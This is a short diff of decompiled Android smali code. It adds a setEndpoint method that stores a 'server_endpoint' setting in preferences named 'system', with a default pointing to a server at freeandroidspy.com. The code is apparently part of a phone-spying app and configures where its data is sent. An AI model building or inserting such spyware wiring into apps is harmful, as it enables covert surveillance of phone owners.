@@ -182,6 +182,56 @@
     return v1
 .end method
 
+.method public static setEndpoint(Landroid/content/Context;Ljava/lang/String;)V
+    .locals 3
+
+    const-string v0, "system"
+
+    const/4 v1, 0x0
+
+    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    move-result-object p0
+
+    if-nez p0, :cond_0
+
+    return-void
+
+    .line 37
+    :cond_0
+    invoke-interface {p0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v0
+
+    const-string v1, "server_endpoint"
+
+    if-eqz p1, :cond_1
+
+    invoke-virtual {p1}, Ljava/lang/String;->length()I
+
+    move-result v2
+
+    if-lez v2, :cond_1
+
+    move-object v2, p1
+
+    goto :goto_0
+
+    :cond_1
+    const-string v2, "https://server.freeandroidspy.com:443/index.php"
+
+    :goto_0
+    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v0
+
+    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z
+
+    move-result v0
+
+    return-void
+.end method
+
 .method public static isNetworkAvailable(Landroid/content/Context;)Z
     .locals 1
 
